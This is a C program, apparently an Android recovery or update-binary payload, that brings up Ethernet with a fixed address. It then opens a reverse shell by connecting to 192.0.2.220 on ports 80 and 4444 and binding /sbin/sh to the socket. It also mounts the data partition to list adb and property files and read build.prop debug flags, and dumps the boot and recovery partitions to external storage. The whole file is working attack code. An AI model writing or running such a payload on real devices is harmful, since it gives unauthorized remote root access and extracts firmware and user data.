#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int SFD = 1;
static const char *ENV[] = { "PATH=/sbin:/system/bin:/system/xbin:/usr/bin",
                             "HOME=/", NULL };

static void up(const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf + 9, sizeof(buf) - 10, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    memcpy(buf, "ui_print ", 9);
    int len = 9 + n;
    buf[len++] = '\n';
    write(SFD, buf, len);
}

static void catfile(const char *p, int maxlines)
{
    FILE *f = fopen(p, "r");
    up("-- %s %s", p, f ? "OK" : "FAIL");
    if (!f) return;
    char b[512];
    int i = 0;
    while (fgets(b, sizeof(b), f) && i++ < maxlines) {
        char *nl = strchr(b, '\n');
        if (nl) *nl = 0;
        up("  %s", b);
    }
    fclose(f);
}

static void runsh(const char *cmd)
{
    int pfd[2];
    if (pipe(pfd) < 0) { up("pipe fail"); return; }
    pid_t pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], 1);
        dup2(pfd[1], 2);
        close(pfd[1]);
        char *av[] = { (char *)"/sbin/sh", (char *)"-c", (char *)cmd, NULL };
        execve("/sbin/sh", av, (char **)ENV);
        _exit(127);
    }
    close(pfd[1]);
    char b[512];
    int n;
    while ((n = read(pfd[0], b, sizeof(b) - 1)) > 0) {
        b[n] = 0;
        char *r = b, *e;
        while ((e = strchr(r, '\n')) != NULL) {
            *e = 0;
            up("  %s", r);
            r = e + 1;
        }
        if (*r) up("  %s", r);
    }
    close(pfd[0]);
    int st;
    waitpid(pid, &st, 0);
    up("  [rc=%d]", WIFEXITED(st) ? WEXITSTATUS(st) : -1);
}

static int try_connect(const char *ip, int port, int timeout_ms)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);
    int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    if (r < 0 && errno == EINPROGRESS) {
        fd_set ws;
        FD_ZERO(&ws);
        FD_SET(fd, &ws);
        struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
        r = select(fd + 1, NULL, &ws, NULL, &tv);
        if (r > 0) {
            int err = 0;
            socklen_t el = sizeof(err);
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
            errno = err;
            r = err ? -1 : 0;
        } else {
            errno = ETIMEDOUT;
            r = -1;
        }
    }
    if (r < 0) { close(fd); return -1; }
    fcntl(fd, F_SETFL, fl);
    return fd;
}

int main(int argc, char **argv)
{
    if (argc > 2) SFD = atoi(argv[2]);
    up("R3-START");

    up("-- net up");
    runsh("ifconfig eth0 up; sleep 2; cat /sys/class/net/eth0/carrier 2>&1");
    runsh("ifconfig eth0 192.0.2.125 netmask 255.255.255.0 up; "
          "route add default gw 192.0.2.1; ping -c 3 -w 8 192.0.2.220 2>&1");
    catfile("/proc/net/route", 6);

    up("-- reverse shell tries");
    int ports[] = { 80, 4444 };
    for (unsigned i = 0; i < sizeof(ports) / sizeof(ports[0]); i++) {
        int fd = try_connect("192.0.2.220", ports[i], 3000);
        up("  port %d -> %s errno=%d", ports[i], fd >= 0 ? "OPEN" : "fail", fd >= 0 ? 0 : errno);
        if (fd >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
                char *av[] = { (char *)"/sbin/sh", (char *)"-", NULL };
                execve("/sbin/sh", av, (char **)ENV);
                _exit(1);
            }
            close(fd);
        } else {
            close(fd);
        }
    }

    up("-- mount data ro");
    mkdir("/mnt/rwd", 0755);
    int m = mount("/dev/block/by-name/data", "/mnt/rwd", "ext4", MS_RDONLY, "");
    up("  mount rc=%d errno=%d", m, m ? errno : 0);
    if (m == 0) {
        runsh("ls /mnt/rwd > /udisk/datalist.txt 2>&1; "
              "ls -la /mnt/rwd/property >> /udisk/datalist.txt 2>&1; "
              "ls /mnt/rwd/adb >> /udisk/datalist.txt 2>&1; "
              "cat /mnt/rwd/system/build.prop 2>/dev/null | grep -E 'debuggable|adb' >> /udisk/datalist.txt; "
              "head -30 /udisk/datalist.txt");
        runsh("umount /mnt/rwd");
    }

    up("-- backup boot+recovery to udisk");
    runsh("dd if=/dev/block/by-name/boot of=/udisk/boot_backup.img bs=8M 2>&1 | tail -2; "
          "dd if=/dev/block/by-name/recovery of=/udisk/recovery_backup.img bs=8M 2>&1 | tail -2; "
          "ls -l /udisk/");

    up("done-marker-reached");
    write(SFD, "done\n", 5);
    return 0;
}
